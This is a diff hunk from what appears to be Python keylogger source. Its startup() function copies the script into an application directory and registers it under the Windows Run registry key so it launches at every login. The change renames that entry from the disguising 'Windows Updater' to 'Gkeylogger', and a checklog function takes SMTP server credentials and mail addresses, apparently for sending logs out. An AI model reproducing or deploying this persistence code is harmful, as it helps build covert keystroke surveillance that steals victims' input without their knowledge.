@@ -37,9 +37,9 @@ def startup():
 	if not os.path.exists(dirapp): 
 		shutil.copy2(sys.argv[0] , dirapp);
 	
-	regquery = os.popen('reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Windows Updater"').read()
+	regquery = os.popen('reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Gkeylogger"').read()
 	if regquery.find(dirapp) < 0:
-		os.popen('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Windows Updater" /t REG_SZ /d "cmd.exe /c ' + dirapp + '"')
+		os.popen('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Gkeylogger" /t REG_SZ /d "cmd.exe /c ' + dirapp + '"')
 		#os.popen("cmd.exe /c " + dirapp)
 
 def checklog(gserver , gport , guser , gpass , mailfrom,  mailto, subject):
